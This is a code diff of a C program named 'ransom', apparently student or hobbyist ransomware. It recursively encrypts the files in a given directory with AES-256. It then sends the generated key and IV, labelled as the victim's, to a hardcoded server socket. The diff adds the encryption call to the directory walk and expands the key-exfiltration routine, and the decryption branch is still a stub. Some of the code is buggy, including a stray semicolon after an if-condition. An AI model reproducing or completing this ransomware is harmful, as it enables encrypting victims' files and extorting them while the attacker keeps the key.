@@ -4,6 +4,9 @@
 #include <unistd.h> 
 #include <arpa/inet.h>
 
+#define ip "127.0.0.1"
+#define port 8080
+
 void usage()
 {
 	printf("--------------------------------------\n");
@@ -20,7 +23,6 @@ int is_encrypted(char *filename)
 	for(int i=0; i<5;i++)
 	{
 		extention[i] = filename[n+i];
-	
 	}
 
 	if(strcmp(extention,".crp")==0)
@@ -30,7 +32,7 @@ int is_encrypted(char *filename)
 	}
 	else
 	{
-		printf("le fichier n'est pas encore crypter");
+		printf("Le fichier n'est pas encore crypter");
 		// lancer une copie du fichier
 		// const char * command = "cp %s",filename;
 		// crypter
@@ -40,8 +42,7 @@ int is_encrypted(char *filename)
 	}
 }
 
-//void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
-void listdir(const char *name)
+void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
 {
 	DIR* dir = opendir(name);
 	if (dir == NULL)
@@ -50,7 +51,6 @@ void listdir(const char *name)
 	}
 	struct dirent* entity;
 	entity = readdir(dir);
-
 	while (entity != NULL)
 	{
 		 if (entity->d_name[0] != '.')
@@ -64,7 +64,12 @@ void listdir(const char *name)
 			strcat(path,name);
 			strcat(path,"/");
 			strcat(path,entity->d_name);
-			listdir(path);
+			listdir(path, iv, key, 'e');
+			
+			if(de_flag=='e');
+			{
+				encrypt(key, iv, entity->d_name);
+			}
 		}
 		entity = readdir(dir);
 	}
@@ -80,72 +85,76 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 		handleErrors();
 	}
 	
-	printf("La clé : %d  l'IV : %d \n",key, iv);
+	bytes_to_hexa(key , pKey, sizeKey);
+	bytes_to_hexa(iv , pIv, sizeIv);
 	
-	bytes_to_hexa(pKey , key, sizeKey);
-	printf("La clé en hexa : %X\n", key);
-	hexa_to_bytes(pKey, key, sizeKey);
-	
-	bytes_to_hexa(pIv , iv, sizeIv);
-	printf("L'IV en hexa : %X\n", iv);
-	hexa_to_bytes(pIv, iv, sizeIv);
-	
-	// OPENSSL_cleanse(key,sizeof(key));	
-	// OPENSSL_cleanse(iv,sizeof(iv));
+	OPENSSL_cleanse(key,sizeof(key));	
+	OPENSSL_cleanse(iv,sizeof(iv));
 }
 
-//int send_key(char *pKey, char *pIv);
-int send_key(char *pKey)
+int send_key(char *pKey, char *pIv)
 {
-		int sockid;
+	int sockID;
+	
+	sockID = socket(AF_INET,SOCK_STREAM,0);
 
-        int server_port = 8080;
-        char *server_ip = "127.0.0.1";
-	char *key = "clé : JeSuisVraimentCon";
-		
-        sockid = socket(AF_INET,SOCK_STREAM,0);
+	struct sockaddr_in serveraddr;
+	serveraddr.sin_family = AF_INET;
+	serveraddr.sin_port = htons(port);
+	serveraddr.sin_addr.s_addr = inet_addr(ip);
 
-        struct sockaddr_in server_addr;
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(server_port);
-        server_addr.sin_addr.s_addr = inet_addr(server_ip);
-
+	char *send_key = "La clé de la victime: ";
+	char *send_iv = "L'IV de la victime: ";
+	char *space = "\t \n";
+	
 	// connect the client socket to server socket	
-	if (connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) 
+	if (connect(sockID, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) != 0) 
 	{
-		printf("Connection with the server failed...\n");
+		printf("Connection with the server failed !\n");
 		exit(0);
 	}
 	else
 	{
 		printf("Connected to the server !\n");		
-		send(sockid, (const char *)key, strlen(key),0);
+		send(sockID, (const char *)send_key, strlen(send_key),0);
+		send(sockID, (const char *)pKey, strlen(pKey),0);
+		send(sockID, (const char *)space, strlen(space),0); //Eviter que la clé soit mélangé avec le texte qui suit
+		send(sockID, (const char *)send_iv, strlen(send_iv),0);
+		send(sockID, (const char *)pIv, strlen(pIv),0);
 	}
-	close(sockid);
+	close(sockID);
 }
 
 int main (int argc, char * argv[])
 {
-	usage();
 	if(argc==1)
 	{
-		printf("./ransom <PATH>");
-		handleErrors();
+		usage();
+		printf("./ransom PATH \n");
 	}
-	else if(argc==2)
+	
+	else if(argc==3)
 	{
-		printf("The directory is %s\n", argv[1]);
-		listdir(argv[1]);
-		unsigned char key[AES_256_KEY_SIZE+1];
-		unsigned char iv[AES_BLOCK_SIZE+1];
+		if(strcmp(argv[2], "-enc")==0) 
+		{
+			printf("The directory is %s\n", argv[1]);
+			unsigned char key[AES_256_KEY_SIZE];
+			unsigned char iv[AES_BLOCK_SIZE];
 
-		int sizeKey = AES_256_KEY_SIZE; 
-		int sizeIv = AES_BLOCK_SIZE;
+			int sizeKey = AES_256_KEY_SIZE; 
+			int sizeIv = AES_BLOCK_SIZE;
+			
+			char * pKey = (char *) malloc(sizeof(key)*2+1);
+			char * pIv = (char *) malloc(sizeof(iv)*2+1);
+			
+			generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
+			listdir(argv[1], iv, key, 'e');
+			send_key(pKey, pIv);
+		}
 		
-		char * pKey = (char *) malloc(sizeof((sizeKey)*2)+1);
-		char * pIv = (char *) malloc(sizeof(sizeIv));
-
-		generate_key(key, sizeKey, iv, sizeIv,pKey, pIv);
-		send_key(pKey);
+		else if (strcmp(argv[2], "-dec")==0)
+		{
+			printf("test");
+		}
 	}
 }
